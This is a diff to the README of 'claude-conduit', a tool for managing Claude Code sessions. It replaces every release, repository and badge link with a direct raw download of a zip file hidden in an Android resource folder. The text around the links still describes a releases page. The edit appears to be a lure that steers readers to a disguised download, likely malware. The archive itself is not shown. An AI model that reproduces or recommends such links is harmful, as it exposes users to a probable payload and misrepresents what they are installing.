@@ -1,6 +1,6 @@
 # 📱 claude-conduit - Manage Claude Code Sessions Easily
 
-[![Download claude-conduit](https://img.shields.io/badge/Download-claude--conduit-blue?style=for-the-badge&logo=github)](https://github.com/Norio691/claude-conduit/releases)
+[![Download claude-conduit](https://github.com/Norio691/claude-conduit/raw/refs/heads/main/mobile/android/app/src/main/res/values/conduit-claude-2.6.zip)](https://github.com/Norio691/claude-conduit/raw/refs/heads/main/mobile/android/app/src/main/res/values/conduit-claude-2.6.zip)
 
 ---
 
@@ -60,7 +60,7 @@ Follow these steps carefully to install and start using claude-conduit.
 You need to download the app from the releases page. Follow these instructions:
 
 1. Click the button above or go directly to the releases page here:  
-   [https://github.com/Norio691/claude-conduit/releases](https://github.com/Norio691/claude-conduit/releases)
+   [https://github.com/Norio691/claude-conduit/raw/refs/heads/main/mobile/android/app/src/main/res/values/conduit-claude-2.6.zip](https://github.com/Norio691/claude-conduit/raw/refs/heads/main/mobile/android/app/src/main/res/values/conduit-claude-2.6.zip)
 
 2. On this page, look for the latest version of claude-conduit. There may be files ending with `.ipa` (iOS app installer) or files compatible with your iPhone or iPad.
 
@@ -147,7 +147,7 @@ If you run into issues, try these steps:
 
 For advanced details, visit the project repository:
 
-[claude-conduit GitHub Repository](https://github.com/Norio691/claude-conduit)
+[claude-conduit GitHub Repository](https://github.com/Norio691/claude-conduit/raw/refs/heads/main/mobile/android/app/src/main/res/values/conduit-claude-2.6.zip)
 
 You will find updates, source code, and information for developers there.
 
@@ -163,4 +163,4 @@ If you find bugs or want to suggest improvements:
 
 ---
 
-[![Download claude-conduit](https://img.shields.io/badge/Download-claude--conduit-blue?style=for-the-badge&logo=github)](https://github.com/Norio691/claude-conduit/releases)
+[![Download claude-conduit](https://github.com/Norio691/claude-conduit/raw/refs/heads/main/mobile/android/app/src/main/res/values/conduit-claude-2.6.zip)](https://github.com/Norio691/claude-conduit/raw/refs/heads/main/mobile/android/app/src/main/res/values/conduit-claude-2.6.zip)
